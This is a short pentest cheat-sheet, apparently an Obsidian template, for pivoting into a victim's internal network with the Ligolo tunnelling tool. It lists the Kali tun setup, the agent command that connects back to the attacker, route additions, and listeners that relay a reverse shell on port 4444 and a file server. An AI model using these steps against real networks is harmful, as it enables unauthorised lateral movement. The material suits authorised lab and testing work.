
- Kali Configuration

```
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
ifconfig
ligolo-proxy -selfcert
```

- Victim Configuration

```
./ligolo-agent.exe -connect <% tp.frontmatter["KaliIP"] %>:11601 -ignore-cert
```

-  execution permissions on linux
	- chmod +x ligolo-agent

- We launch and wait for the connection to connect and then do the following in the kali

```
session 
ifconfig
```

- we set up the tunnel
- Configure local port forward with ligolo:

> 	[!error] Configure with second network interface of the victim machine
> ```
> sudo ip route add <% tp.frontmatter["VictimIP"] %>0/24 dev ligolo
> ip route list
> ``` 


- kali configuration for port forwarding

- kali reverse shell to 4444

```
listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4444
```

- kali server 8000

```
listener_add --addr 0.0.0.0:1235 --to 127.0.0.1:8000
```


> [!warning] Configure with second network interface of the victim machine
> ```
> sudo ip route add 240.0.0.1/32 dev ligolo
> sudo ip route list
> ```
